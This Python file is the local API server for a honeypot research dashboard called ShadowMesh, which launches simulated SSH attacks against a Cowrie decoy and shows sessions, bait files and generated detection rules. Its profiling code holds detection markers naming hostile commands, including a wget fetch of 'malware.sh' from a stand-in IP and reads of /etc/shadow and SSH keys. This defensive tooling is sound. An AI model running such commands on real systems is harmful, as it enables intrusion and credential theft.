"""Local API and web server for the ShadowMesh reviewer dashboard.

The server deliberately sits above the existing project services. It does not
replace Cowrie, Elasticsearch, the attacker, the adaptive agent, or either
generator. It only exposes their existing controls and data through a small,
localhost-only HTTP API and serves the compiled React interface.
"""

from __future__ import annotations

import argparse
import json
import mimetypes
import os
import signal
import subprocess
import sys
import threading
import uuid
from datetime import datetime, timedelta, timezone
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib import error, parse, request

ROOT_DIR = Path(__file__).resolve().parents[1]
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from dashboard.logic import BAIT_FILES, classify_session, explain_action, explain_command

COMPOSE_FILE = ROOT_DIR / "infra" / "docker-compose.yml"
WEB_DIST = ROOT_DIR / "dashboard" / "web" / "dist"
RULES_DIR = ROOT_DIR / "rules" / "output"
PROFILE_STATE_PATH = ROOT_DIR / "dashboard" / ".profile_state.json"
ES_URL = os.getenv("DASHBOARD_ES_URL", "http://127.0.0.1:9200").rstrip("/")

SERVICE_LABELS = {
    "cowrie": "Honeypot",
    "elasticsearch": "Elasticsearch",
    "forwarder": "Event pipeline",
    "agent-runner": "Adaptive agent",
    "action-executor": "Action executor",
    "kibana": "Kibana",
}

_state_lock = threading.Lock()
_jobs: dict[str, dict[str, Any]] = {}
_active_attack: dict[str, Any] | None = None
_previous_attack_summary: dict[str, Any] | None = None
try:
    _session_profiles: dict[str, str] = json.loads(
        PROFILE_STATE_PATH.read_text(encoding="utf-8")
    )
except (OSError, json.JSONDecodeError):
    _session_profiles = {}


def remember_session_profile(session_id: str, profile: str) -> None:
    _session_profiles[session_id] = profile
    try:
        PROFILE_STATE_PATH.write_text(
            json.dumps(_session_profiles, indent=2, sort_keys=True), encoding="utf-8"
        )
    except OSError:
        # Profile persistence is helpful but must never break telemetry display.
        pass


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def project_python() -> str:
    for candidate in (
        ROOT_DIR / ".venv311" / "bin" / "python",
        ROOT_DIR / ".venv" / "bin" / "python",
    ):
        if candidate.exists():
            return str(candidate)
    return sys.executable


def generative_python() -> str:
    candidate = ROOT_DIR / "generative" / "venv" / "bin" / "python"
    return str(candidate) if candidate.exists() else project_python()


def es_request(
    method: str,
    path: str,
    body: dict[str, Any] | None = None,
    timeout: float = 3.0,
) -> tuple[bool, dict[str, Any]]:
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = request.Request(
        f"{ES_URL}/{path.lstrip('/')}", data=data, headers=headers, method=method
    )
    try:
        with request.urlopen(req, timeout=timeout) as response:
            return True, json.loads(response.read().decode() or "{}")
    except (
        error.URLError,
        error.HTTPError,
        TimeoutError,
        ConnectionError,
        OSError,
        json.JSONDecodeError,
    ) as exc:
        return False, {"error": str(exc)}


def search_index(
    index: str,
    *,
    size: int = 20,
    query: dict[str, Any] | None = None,
    ascending: bool = False,
) -> list[dict[str, Any]]:
    ok, data = es_request(
        "POST",
        f"{index}/_search",
        {
            "size": size,
            "sort": [{"@timestamp": {"order": "asc" if ascending else "desc"}}],
            "query": query or {"match_all": {}},
        },
    )
    if not ok:
        return []
    return [hit.get("_source", {}) for hit in data.get("hits", {}).get("hits", [])]


def docker_services() -> list[dict[str, Any]]:
    try:
        completed = subprocess.run(
            [
                "docker",
                "compose",
                "-f",
                str(COMPOSE_FILE),
                "ps",
                "--format",
                "json",
            ],
            cwd=ROOT_DIR,
            capture_output=True,
            text=True,
            timeout=12,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return []

    if completed.returncode != 0:
        return []

    try:
        payload = json.loads(completed.stdout)
        if isinstance(payload, list):
            return [item for item in payload if isinstance(item, dict)]
        if isinstance(payload, dict):
            return [payload]
    except json.JSONDecodeError:
        pass

    services = []
    for line in completed.stdout.splitlines():
        try:
            services.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return services


def service_payload() -> dict[str, Any]:
    compose_services = docker_services()
    by_name = {
        item.get("Service") or item.get("Name", ""): item for item in compose_services
    }
    es_ok, health = es_request("GET", "_cluster/health")
    services = []
    for key, label in SERVICE_LABELS.items():
        item = by_name.get(key, {})
        raw_state = str(item.get("State") or item.get("Status") or "")
        running = "running" in raw_state.lower()
        if key == "elasticsearch" and es_ok:
            running = True
            raw_state = str(health.get("status", "online"))
        services.append(
            {
                "id": key,
                "name": label,
                "online": running,
                "state": raw_state or "offline",
            }
        )
    return {
        "services": services,
        "online": sum(1 for item in services if item["online"]),
        "total": len(services),
        "elasticsearch": health if es_ok else None,
    }


def attack_command(profile: str, sessions: int) -> list[str]:
    return [
        "docker",
        "compose",
        "-f",
        str(COMPOSE_FILE),
        "--profile",
        "attack",
        "run",
        "--rm",
        "-e",
        "POST_LOGIN_INITIAL_DELAY_SECONDS=1.2",
        "attacker",
        "python",
        "simulate.py",
        "--profile",
        profile,
        "--sessions",
        str(sessions),
        "--delay",
        "0.8",
    ]


def run_process(
    command: list[str],
    *,
    env_overrides: dict[str, str] | None = None,
    timeout: int = 180,
) -> tuple[int, str]:
    """Run one project command and return a bounded combined output."""
    env = os.environ.copy()
    if env_overrides:
        env.update(env_overrides)
    try:
        completed = subprocess.run(
            command,
            cwd=ROOT_DIR,
            env=env,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as exc:
        return 1, str(exc)
    output = "\n".join(
        part for part in (completed.stdout.strip(), completed.stderr.strip()) if part
    )
    return completed.returncode, output[-12000:]


def set_attack_phase(phase: str, message: str) -> None:
    with _state_lock:
        if _active_attack is not None:
            _active_attack["phase"] = phase
            _active_attack["message"] = message


def append_job_output(job: dict[str, Any], text: str) -> None:
    if not text:
        return
    with _state_lock:
        current = str(job.get("output") or "")
        job["output"] = f"{current}\n{text}".strip()[-12000:]


def wait_for_stack(timeout_seconds: int = 90) -> bool:
    """Wait until Cowrie is running and Elasticsearch accepts requests."""
    deadline = datetime.now(timezone.utc).timestamp() + timeout_seconds
    while datetime.now(timezone.utc).timestamp() < deadline:
        es_ok, _ = es_request("GET", "_cluster/health", timeout=2)
        services = docker_services()
        cowrie_online = any(
            (item.get("Service") == "cowrie" or item.get("Name") == "cowrie")
            and "running" in str(item.get("State") or item.get("Status") or "").lower()
            for item in services
        )
        if es_ok and cowrie_online:
            return True
        threading.Event().wait(1.5)
    return False


def session_created_after(started_at: str, baseline_ids: set[str]) -> dict[str, Any] | None:
    candidates = search_index(
        "honeypot-sessions",
        size=30,
        query={"range": {"@timestamp": {"gte": started_at}}},
    )
    fresh = [
        item
        for item in candidates
        if item.get("session_id") and str(item.get("session_id")) not in baseline_ids
    ]
    successful = [
        item for item in fresh
        if item.get("login_success") or int(item.get("command_count", 0) or 0) > 0
    ]
    return max(successful or fresh, key=lambda item: str(item.get("@timestamp") or ""), default=None)


def fresh_attack_sessions(attack: dict[str, Any]) -> list[dict[str, Any]]:
    baseline = set(str(item) for item in attack.get("baseline_session_ids", []))
    return [
        item
        for item in search_index(
            "honeypot-sessions",
            size=100,
            query={"range": {"@timestamp": {"gte": attack["started_at"]}}},
            ascending=True,
        )
        if item.get("session_id") and str(item.get("session_id")) not in baseline
    ]


def primary_attack_session(items: list[dict[str, Any]]) -> dict[str, Any] | None:
    successful = [
        item for item in items
        if item.get("login_success") or int(item.get("command_count", 0) or 0) > 0
    ]
    return max(successful or items, key=lambda item: str(item.get("@timestamp") or ""), default=None)


def merge_attack_session(items: list[dict[str, Any]], primary: dict[str, Any]) -> dict[str, Any]:
    merged = dict(primary)
    failed_attempts = sum(
        int(item.get("login_attempts", 0) or 0)
        for item in items
        if not item.get("login_success")
    )
    merged["login_success"] = any(bool(item.get("login_success")) for item in items)
    merged["login_attempts"] = failed_attempts + (1 if merged["login_success"] else 0)
    usernames: list[str] = []
    for item in items:
        for username in item.get("usernames_tried", []) or []:
            if username not in usernames:
                usernames.append(username)
    merged["usernames_tried"] = usernames
    merged["brute_force_detected"] = merged["login_attempts"] > 3
    return merged


def launch_attack(profile: str, sessions: int, is_follow_up: bool = False) -> dict[str, Any]:
    """Run the complete reviewer scenario without blocking the API request."""
    global _active_attack

    job_id = uuid.uuid4().hex[:12]
    started_at = (datetime.now(timezone.utc) - timedelta(seconds=3)).isoformat()
    baseline_ids = {
        str(item.get("session_id"))
        for item in search_index("honeypot-sessions", size=50)
        if item.get("session_id")
    }
    job: dict[str, Any] = {
        "id": job_id,
        "name": f"{profile} scenario",
        "status": "running",
        "started_at": started_at,
        "finished_at": None,
        "returncode": None,
        "output": "",
        "process": None,
    }
    with _state_lock:
        _jobs[job_id] = job
        _active_attack = {
            "job_id": job_id,
            "profile": profile,
            "sessions": sessions,
            "started_at": started_at,
            "baseline_session_ids": sorted(baseline_ids),
            "phase": "starting_services",
            "message": "Starting the local ShadowMesh services.",
            "is_follow_up": is_follow_up,
        }

    def fail(message: str, output: str = "") -> None:
        append_job_output(job, output or message)
        set_attack_phase("failed", message)
        with _state_lock:
            job["status"] = "failed"
            job["returncode"] = 1
            job["finished_at"] = utc_now()

    def run_scenario() -> None:
        set_attack_phase("starting_services", "Starting the honeypot and telemetry services.")
        returncode, output = run_process(
            ["docker", "compose", "-f", str(COMPOSE_FILE), "up", "-d"],
            timeout=300,
        )
        append_job_output(job, output)
        if returncode != 0:
            fail("The local services could not be started.", output)
            return

        set_attack_phase("waiting_for_services", "Waiting for Cowrie and Elasticsearch to become ready.")
        if not wait_for_stack():
            fail("Cowrie or Elasticsearch did not become ready in time.")
            return

        set_attack_phase("running_attack", "The simulator is connecting to the honeypot.")
        env = os.environ.copy()
        try:
            process = subprocess.Popen(
                attack_command(profile, sessions),
                cwd=ROOT_DIR,
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                start_new_session=True,
            )
        except OSError as exc:
            fail("The attacker simulator could not be launched.", str(exc))
            return
        with _state_lock:
            job["process"] = process
        output, _ = process.communicate()
        append_job_output(job, output or "")
        if process.returncode != 0:
            fail("The attacker simulator stopped with an error.", output or "")
            return

        set_attack_phase("processing_events", "The session is being assembled from captured events.")
        session: dict[str, Any] | None = None
        for _ in range(30):
            session = session_created_after(started_at, baseline_ids)
            if session:
                break
            threading.Event().wait(1)

        if session and session.get("session_id"):
            session_id = str(session["session_id"])
            remember_session_profile(session_id, profile)

            # Stage 04: Decide - The adaptive agent evaluates the completed session
            set_attack_phase("waiting_for_action", "The adaptive agent is evaluating the completed session.")
            actions: list[dict[str, Any]] = []
            for _ in range(8):
                actions = search_index(
                    "honeypot-rl-actions",
                    size=1,
                    query={"term": {"session_id": session_id}},
                )
                if actions:
                    break
                threading.Event().wait(1)

            # Fallback if background agent container has not polled yet
            if not actions:
                run_process(
                    [
                        project_python(),
                        "-m",
                        "agent.runner",
                        "--session-id",
                        session_id,
                        "--once",
                        "--include-closed",
                    ],
                    env_overrides={"ES_HOST": "localhost", "ES_PORT": "9200"},
                    timeout=30,
                )
                actions = search_index(
                    "honeypot-rl-actions",
                    size=1,
                    query={"term": {"session_id": session_id}},
                )

            # Allow reviewer to visually register Stage 04 Decide
            threading.Event().wait(1.5)

            # Stage 05: Deceive - Materialize decoy credentials in HoneyFS
            set_attack_phase("materializing_bait", "The executor is mounting adaptive decoy artifacts into Cowrie filesystem.")
            run_process(
                [
                    project_python(),
                    "-m",
                    "agent.executor",
                    "--once",
                ],
                env_overrides={"ES_HOST": "localhost", "ES_PORT": "9200"},
                timeout=30,
            )
            # Allow reviewer to visually register Stage 05 Deceive
            threading.Event().wait(2.0)

            # Stage 06: Detect - Compile Snort and YARA detection rules
            set_attack_phase("generating_rules", "Turning the observed behaviour into detection rules.")
            rule_returncode = 1
            rule_output = ""
            for _ in range(5):
                rule_returncode, rule_output = run_process(
                    [
                        project_python(),
                        "-m",
                        "rules.generator",
                        "--limit",
                        "1",
                        "--session-id",
                        session_id,
                        "--include-active",
                    ],
                    env_overrides={"ES_HOST": "localhost", "ES_PORT": "9200"},
                    timeout=120,
                )
                append_job_output(job, rule_output)
                if rule_returncode == 0:
                    break
                threading.Event().wait(1)

            if rule_returncode != 0:
                append_job_output(job, "The attack completed, but automatic rule generation failed.")
            else:
                # Allow reviewer to visually register Stage 06 Detect
                threading.Event().wait(2.0)
        else:
            append_job_output(job, "The attack completed, but no new session summary arrived before the timeout.")

        set_attack_phase("completed", "The scenario is complete and the evidence is ready to review.")
        with _state_lock:
            global _previous_attack_summary
            job["status"] = "completed"
            job["returncode"] = 0
            job["finished_at"] = utc_now()
            job["process"] = None
            if session and session.get("session_id"):
                summary_data = {
                    "job_id": job["id"],
                    "profile": profile,
                    "session_id": str(session["session_id"]),
                    "session": enrich_session(session, profile=profile),
                    "action": actions[0] if actions else None,
                    "is_follow_up": is_follow_up,
                    "had_bait_trigger": any("/etc/passwd" in str(c) or "/etc/shadow" in str(c) for c in (session.get("commands") or [])),
                    "follow_up_occurred": any("backupsvc" in str(c) or "cloudsync" in str(c) for c in (session.get("commands") or [])),
                    "command_count": session.get("command_count", len(session.get("commands", []))),
                    "completed_at": utc_now(),
                }
                # Preserve the initial probe session summary when follow-up runs
                if not is_follow_up or _previous_attack_summary is None:
                    _previous_attack_summary = summary_data

    threading.Thread(target=run_scenario, daemon=True).start()
    return public_job(job)


def launch_job(
    name: str,
    command: list[str],
    *,
    env_overrides: dict[str, str] | None = None,
    attack: bool = False,
) -> dict[str, Any]:
    global _active_attack

    job_id = uuid.uuid4().hex[:12]
    env = os.environ.copy()
    if env_overrides:
        env.update(env_overrides)

    baseline_ids: list[str] = []
    if attack:
        baseline_ids = [
            str(item.get("session_id"))
            for item in search_index("honeypot-sessions", size=50)
            if item.get("session_id")
        ]

    try:
        process = subprocess.Popen(
            command,
            cwd=ROOT_DIR,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )
    except OSError as exc:
        raise RuntimeError(str(exc)) from exc

    job = {
        "id": job_id,
        "name": name,
        "status": "running",
        "started_at": utc_now(),
        "finished_at": None,
        "returncode": None,
        "output": "",
        "process": process,
    }
    public_job = {key: value for key, value in job.items() if key != "process"}

    with _state_lock:
        _jobs[job_id] = job
        if attack:
            _active_attack = {
                "job_id": job_id,
                "profile": name.replace(" attack", ""),
                "started_at": job["started_at"],
                "baseline_session_ids": baseline_ids,
            }

    def collect_output() -> None:
        output, _ = process.communicate()
        with _state_lock:
            job["returncode"] = process.returncode
            job["finished_at"] = utc_now()
            job["status"] = "completed" if process.returncode == 0 else "failed"
            job["output"] = (output or "").strip()[-12000:]

    threading.Thread(target=collect_output, daemon=True).start()
    return public_job


def public_job(job: dict[str, Any]) -> dict[str, Any]:
    return {key: value for key, value in job.items() if key != "process"}


def current_attack() -> dict[str, Any] | None:
    with _state_lock:
        if not _active_attack:
            return None
        attack = dict(_active_attack)
        job = _jobs.get(attack["job_id"])
        if job:
            attack["status"] = job["status"]
            attack["returncode"] = job["returncode"]
            attack["output"] = job.get("output", "")
        return attack


def cancel_active_attack() -> dict[str, Any]:
    """Stop the simulator process launched by this dashboard, if one is running."""
    with _state_lock:
        if not _active_attack:
            raise ValueError("No scenario is currently active")
        job = _jobs.get(_active_attack["job_id"])
        process = job.get("process") if job else None
        if not job or job.get("status") != "running" or process is None:
            raise ValueError("No running scenario can be stopped")
        try:
            os.killpg(process.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        job["status"] = "failed"
        job["returncode"] = -signal.SIGTERM
        job["finished_at"] = utc_now()
        job["output"] = f"{job.get('output', '')}\nScenario cancelled from dashboard.".strip()
        _active_attack["phase"] = "failed"
        _active_attack["message"] = "The scenario was stopped from the dashboard."
        return public_job(job)


def latest_live_payload() -> dict[str, Any]:
    attack = current_attack()
    session: dict[str, Any] | None = None
    events: list[dict[str, Any]] = []

    if not attack:
        return {
            "attack": None,
            "session": None,
            "events": [],
            "actions": [],
            "rules": [],
            "previous_run": _previous_attack_summary,
            "updated_at": utc_now(),
        }

    events = search_index(
        "honeypot-cowrie-events",
        size=120,
        query={"range": {"@timestamp": {"gte": attack["started_at"]}}},
        ascending=True,
    )
    fresh_sessions = fresh_attack_sessions(attack)
    primary = primary_attack_session(fresh_sessions)
    session_ids = [str(item.get("session_id")) for item in events if item.get("session_id")]
    session_id = str(primary.get("session_id")) if primary else (session_ids[-1] if session_ids else None)
    if session_id:
        if attack.get("profile"):
            remember_session_profile(session_id, str(attack["profile"]))
        matching = search_index(
            "honeypot-sessions",
            size=1,
            query={"term": {"session_id": session_id}},
        )
        session = matching[0] if matching else {"session_id": session_id}
        event_type = lambda item: str(item.get("event_type") or item.get("eventid"))
        first_connect = next((item for item in events if event_type(item) == "cowrie.session.connect"), None)
        failed_logins = [item for item in events if event_type(item) == "cowrie.login.failed"]
        successful_login = next((item for item in events if event_type(item) == "cowrie.login.success"), None)
        primary_events = [
            item for item in events
            if str(item.get("session_id")) == session_id
            and event_type(item) not in {"cowrie.session.connect", "cowrie.login.failed", "cowrie.login.success"}
        ]
        events = [item for item in [first_connect, *failed_logins, successful_login, *primary_events] if item]
        events.sort(key=lambda item: str(item.get("@timestamp") or item.get("timestamp") or ""))

    if not session:
        candidates = search_index(
            "honeypot-sessions",
            size=20,
            query={"range": {"@timestamp": {"gte": attack["started_at"]}}},
        )
        baseline = set(attack.get("baseline_session_ids", []))
        fresh = [item for item in candidates if str(item.get("session_id")) not in baseline]
        session = primary_attack_session(fresh)

    if fresh_sessions:
        primary = primary_attack_session(fresh_sessions)
        if primary:
            session = primary
            session_id = str(primary.get("session_id"))
            session = merge_attack_session(fresh_sessions, primary)
        else:
            session_id = str(session.get("session_id")) if session and session.get("session_id") else None
    else:
        session_id = str(session.get("session_id")) if session and session.get("session_id") else None

    session_profile = _session_profiles.get(session_id or "") or str(attack.get("profile") or "")

    actions = (
        search_index(
            "honeypot-rl-actions",
            size=20,
            query={"term": {"session_id": session_id}},
            ascending=True,
        )
        if session_id
        else []
    )
    rules = (
        search_index(
            "honeypot-generated-rules",
            size=20,
            query={"term": {"session_id": session_id}},
            ascending=True,
        )
        if session_id
        else []
    )

    return {
        "attack": attack,
        "session": enrich_session(session, profile=session_profile) if session else None,
        "events": [enrich_event(item) for item in events],
        "actions": [enrich_action(item) for item in actions],
        "rules": rules,
        "previous_run": _previous_attack_summary,
        "updated_at": utc_now(),
    }


def enrich_session(session: dict[str, Any], profile: str | None = None) -> dict[str, Any]:
    label, explanation = classify_session(session)
    enriched = {**session, "attack_type": label, "explanation": explanation}
    resolved_profile = profile or infer_attacker_profile(session)
    if resolved_profile:
        enriched["attacker_profile"] = resolved_profile
    return enriched


def infer_attacker_profile(session: dict[str, Any]) -> str | None:
    """Infer only the project's deterministic simulator profiles from commands."""
    commands = [str(command).lower() for command in session.get("commands", []) if command]
    combined = "\n".join(commands)
    command_count = int(session.get("command_count", len(commands)) or len(commands))

    targeted_markers = (
        "cat /etc/ssh/sshd_config",
        "crontab -l",
        "cat /var/log/auth.log",
        "find / -perm -4000",
        "find / -name '*.conf'",
    )
    if any(marker in combined for marker in targeted_markers):
        return "targeted"

    opportunist_markers = (
        "cat /etc/shadow",
        "netstat -tulnp",
        "ps aux",
        "wget http://203.0.113.10/malware.sh",
    )
    if sum(marker in combined for marker in opportunist_markers) >= 3:
        return "opportunist"

    script_kiddie_commands = {"uname -a", "id", "cat /etc/passwd", "ls", "whoami"}
    if commands and command_count <= 7 and set(commands).issubset(script_kiddie_commands):
        return "scriptkiddie"
    return None


def enrich_event(event: dict[str, Any]) -> dict[str, Any]:
    command = event.get("command") or event.get("input")
    event_type = str(event.get("event_type") or event.get("eventid") or "event")
    return {
        **event,
        "event_type": event_type,
        "command": command,
        "phase": event_phase(event_type, command),
        "explanation": explain_command(str(command)) if command else event_label(event_type),
    }


def event_phase(event_type: str, command: str | None = None) -> str:
    if event_type == "cowrie.session.connect":
        return "discovery"
    if event_type in {"cowrie.login.failed", "cowrie.login.success"}:
        return "credentials"
    if event_type in {"cowrie.command.input", "cowrie.session.file_download"}:
        lowered = str(command or "").lower()
        if any(marker in lowered for marker in ("/etc/passwd", "/etc/shadow", ".env", "id_rsa", "bash_history", "config.php")):
            return "bait"
        return "exploration"
    if event_type in {"cowrie.session.closed", "cowrie.log.closed"}:
        return "closed"
    return "connection"


def event_label(event_type: str) -> str:
    labels = {
        "cowrie.session.connect": "The attacker identified an SSH service and opened a connection to the decoy.",
        "cowrie.client.version": "The attacker exchanged SSH version details with the decoy.",
        "cowrie.client.kex": "The attacker negotiated an SSH session with the decoy.",
        "cowrie.login.failed": "A credential attempt was rejected by the decoy.",
        "cowrie.login.success": "Cowrie accepted the credentials and opened the fake shell.",
        "cowrie.command.input": "A command was captured inside the decoy.",
        "cowrie.session.params": "The decoy created a session context for the attacker.",
        "cowrie.session.file_download": "A payload download attempt was recorded.",
        "cowrie.session.closed": "The attacker ended the session.",
    }
    return labels.get(event_type, "The honeypot recorded attacker activity.")


def enrich_action(action: dict[str, Any]) -> dict[str, Any]:
    name = str(action.get("action_name") or action.get("action") or "")
    return {**action, "name": name, "explanation": explain_action(name)}


def bait_list() -> list[dict[str, Any]]:
    manifest_path = ROOT_DIR / "generative" / "cache" / "manifest.json"
    try:
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        manifest = {}
    manifest_by_path = {
        item.get("cowrie_path"): item
        for item in manifest.get("files", [])
        if isinstance(item, dict)
    }
    result = []
    for item in BAIT_FILES:
        path = ROOT_DIR / item.local_path
        result.append(
            {
                "id": item.local_path.name,
                "name": item.name,
                "attacker_path": item.attacker_path,
                "explanation": item.explanation,
                "exists": path.exists(),
                "size": path.stat().st_size if path.exists() else 0,
                "metadata": manifest_by_path.get(item.attacker_path, {}),
            }
        )
    return result


def bait_content(file_id: str) -> dict[str, Any] | None:
    clean_id = file_id.strip("/")
    bait = next(
        (
            item for item in BAIT_FILES
            if item.local_path.name == file_id
            or item.local_path.name == clean_id
            or item.local_path.name == Path(clean_id).name
            or item.attacker_path == file_id
            or item.attacker_path == f"/{clean_id}"
        ),
        None,
    )
    if not bait:
        return None
    path = ROOT_DIR / bait.local_path
    if not path.exists():
        return None
    return {
        "id": bait.local_path.name,
        "name": bait.name,
        "attacker_path": bait.attacker_path,
        "explanation": bait.explanation,
        "content": path.read_text(encoding="utf-8", errors="replace")[:24000],
    }


def rule_files() -> list[dict[str, Any]]:
    if not RULES_DIR.exists():
        return []
    files = []
    for path in sorted(RULES_DIR.rglob("*"), key=lambda item: item.stat().st_mtime, reverse=True):
        if not path.is_file() or path.name == ".gitkeep":
            continue
        files.append(
            {
                "id": str(path.relative_to(RULES_DIR)),
                "name": path.name,
                "type": "Snort" if path.suffix == ".rules" else "YARA",
                "size": path.stat().st_size,
                "modified_at": datetime.fromtimestamp(path.stat().st_mtime, timezone.utc).isoformat(),
            }
        )
    return files[:100]


def rule_content(file_id: str) -> dict[str, Any] | None:
    candidate = (RULES_DIR / file_id).resolve()
    try:
        candidate.relative_to(RULES_DIR.resolve())
    except ValueError:
        return None
    if not candidate.is_file():
        return None
    return {
        "id": file_id,
        "name": candidate.name,
        "content": candidate.read_text(encoding="utf-8", errors="replace")[:30000],
    }


class DashboardHandler(BaseHTTPRequestHandler):
    server_version = "ShadowMeshDashboard/1.0"

    def log_message(self, format: str, *args: object) -> None:
        if os.getenv("DASHBOARD_ACCESS_LOG") == "1":
            super().log_message(format, *args)

    def do_GET(self) -> None:  # noqa: N802
        path = parse.urlparse(self.path).path
        query = parse.parse_qs(parse.urlparse(self.path).query)

        if path == "/api/health":
            self.send_json({"status": "ok", "time": utc_now()})
        elif path == "/api/services":
            self.send_json(service_payload())
        elif path == "/api/live":
            self.send_json(latest_live_payload())
        elif path == "/api/sessions":
            limit = bounded_int(query.get("limit", ["40"])[0], 1, 100)
            self.send_json(
                {
                    "sessions": [
                        enrich_session(item, profile=_session_profiles.get(str(item.get("session_id"))))
                        for item in search_index("honeypot-sessions", size=limit)
                    ]
                }
            )
        elif path.startswith("/api/sessions/"):
            self.handle_session_path(path)
        elif path == "/api/rules":
            self.send_json(
                {
                    "records": search_index("honeypot-generated-rules", size=50),
                    "files": rule_files(),
                }
            )
        elif path.startswith("/api/rule-files/"):
            content = rule_content(parse.unquote(path.removeprefix("/api/rule-files/")))
            self.send_json(content or {"error": "Rule file not found"}, HTTPStatus.OK if content else HTTPStatus.NOT_FOUND)
        elif path == "/api/bait":
            self.send_json({"files": bait_list()})
        elif path.startswith("/api/bait/"):
            content = bait_content(parse.unquote(path.removeprefix("/api/bait/")))
            self.send_json(content or {"error": "Bait file not found"}, HTTPStatus.OK if content else HTTPStatus.NOT_FOUND)
        elif path == "/api/jobs":
            with _state_lock:
                jobs = [public_job(job) for job in reversed(list(_jobs.values()))]
            self.send_json({"jobs": jobs[:20]})
        else:
            self.serve_frontend(path)

    def do_POST(self) -> None:  # noqa: N802
        path = parse.urlparse(self.path).path
        payload = self.read_json()
        try:
            if path == "/api/attack":
                profile = str(payload.get("profile", "opportunist"))
                if profile not in {"opportunist", "scriptkiddie", "targeted"}:
                    raise ValueError("Unknown attack profile")
                sessions = bounded_int(payload.get("sessions", 1), 1, 10)
                is_follow_up = bool(payload.get("is_follow_up", False))
                attack = current_attack()
                if attack and attack.get("status") == "running":
                    self.send_json({"error": "An attack is already running"}, HTTPStatus.CONFLICT)
                    return
                job = launch_attack(profile, sessions, is_follow_up=is_follow_up)
                self.send_json({"job": job}, HTTPStatus.ACCEPTED)
            elif path == "/api/attack/cancel":
                self.send_json({"job": cancel_active_attack()}, HTTPStatus.ACCEPTED)
            elif path == "/api/stack/start":
                command = ["docker", "compose", "-f", str(COMPOSE_FILE), "up", "-d"]
                if bool(payload.get("rebuild")):
                    command.append("--build")
                self.send_json({"job": launch_job("Start services", command)}, HTTPStatus.ACCEPTED)
            elif path == "/api/stack/stop":
                command = ["docker", "compose", "-f", str(COMPOSE_FILE), "stop"]
                self.send_json({"job": launch_job("Stop services", command)}, HTTPStatus.ACCEPTED)
            elif path == "/api/bait/regenerate":
                command = [generative_python(), "generative/generator.py"]
                self.send_json({"job": launch_job("Regenerate bait", command)}, HTTPStatus.ACCEPTED)
            elif path == "/api/rules/generate":
                command = [project_python(), "-m", "rules.generator", "--limit", "1"]
                session_id = str(payload.get("session_id", "")).strip()
                if session_id:
                    command.extend(["--session-id", session_id])
                self.send_json(
                    {
                        "job": launch_job(
                            "Generate rules",
                            command,
                            env_overrides={"ES_HOST": "localhost", "ES_PORT": "9200"},
                        )
                    },
                    HTTPStatus.ACCEPTED,
                )
            else:
                self.send_json({"error": "Not found"}, HTTPStatus.NOT_FOUND)
        except (RuntimeError, ValueError) as exc:
            self.send_json({"error": str(exc)}, HTTPStatus.BAD_REQUEST)

    def handle_session_path(self, path: str) -> None:
        parts = [parse.unquote(part) for part in path.split("/") if part]
        if len(parts) < 3:
            self.send_json({"error": "Session not found"}, HTTPStatus.NOT_FOUND)
            return
        session_id = parts[2]
        suffix = parts[3] if len(parts) > 3 else ""
        if suffix == "events":
            items = search_index(
                "honeypot-cowrie-events",
                size=200,
                query={"term": {"session_id": session_id}},
                ascending=True,
            )
            self.send_json({"events": [enrich_event(item) for item in items]})
        elif suffix == "actions":
            items = search_index(
                "honeypot-rl-actions",
                size=100,
                query={"term": {"session_id": session_id}},
                ascending=True,
            )
            self.send_json({"actions": [enrich_action(item) for item in items]})
        else:
            items = search_index(
                "honeypot-sessions", size=1, query={"term": {"session_id": session_id}}
            )
            self.send_json(
                {
                    "session": enrich_session(
                        items[0], profile=_session_profiles.get(session_id)
                    )
                    if items
                    else None
                },
                HTTPStatus.OK if items else HTTPStatus.NOT_FOUND,
            )

    def read_json(self) -> dict[str, Any]:
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if not length:
                return {}
            return json.loads(self.rfile.read(length).decode())
        except (ValueError, json.JSONDecodeError):
            return {}

    def send_json(self, payload: Any, status: HTTPStatus = HTTPStatus.OK) -> None:
        body = json.dumps(payload, default=str).encode()
        self.send_response(status.value)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def serve_frontend(self, path: str) -> None:
        if not WEB_DIST.exists():
            self.send_json(
                {
                    "error": "Dashboard frontend is not built",
                    "help": "Run: cd dashboard/web && npm install && npm run build",
                },
                HTTPStatus.SERVICE_UNAVAILABLE,
            )
            return
        relative = path.lstrip("/") or "index.html"
        candidate = (WEB_DIST / relative).resolve()
        try:
            candidate.relative_to(WEB_DIST.resolve())
        except ValueError:
            candidate = WEB_DIST / "index.html"
        if not candidate.is_file():
            candidate = WEB_DIST / "index.html"
        body = candidate.read_bytes()
        content_type = mimetypes.guess_type(candidate.name)[0] or "application/octet-stream"
        self.send_response(HTTPStatus.OK.value)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-cache" if candidate.name == "index.html" else "public, max-age=31536000, immutable")
        self.end_headers()
        self.wfile.write(body)


def bounded_int(value: Any, minimum: int, maximum: int) -> int:
    try:
        parsed_value = int(value)
    except (TypeError, ValueError):
        parsed_value = minimum
    return max(minimum, min(maximum, parsed_value))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the ShadowMesh dashboard")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8501)
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    server = ThreadingHTTPServer((args.host, args.port), DashboardHandler)
    print(f"ShadowMesh dashboard: http://{args.host}:{args.port}")
